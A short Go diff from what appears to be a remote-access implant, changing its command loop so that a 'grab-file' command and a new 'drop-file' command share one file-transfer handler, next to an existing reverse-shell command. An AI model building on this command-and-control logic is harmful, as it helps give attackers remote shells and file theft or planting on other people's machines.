@@ -32,7 +32,10 @@ func CommandLoop(cmdCon comms.Connection) (err error) {
 			err = commands.ReverseShellReply(cmdCon)
 		case "grab-file":
 			path := strings.Join(args[1:], " ")
-			err = commands.GrabFileReply(cmdCon, path)
+			err = commands.FileCmdReply(cmdCon, path, false)
+		case "drop-file":
+			path := strings.Join(args[1:], " ")
+			err = commands.FileCmdReply(cmdCon, path, true)
 		}
 
 		if comms.IsNetworkError(err) {
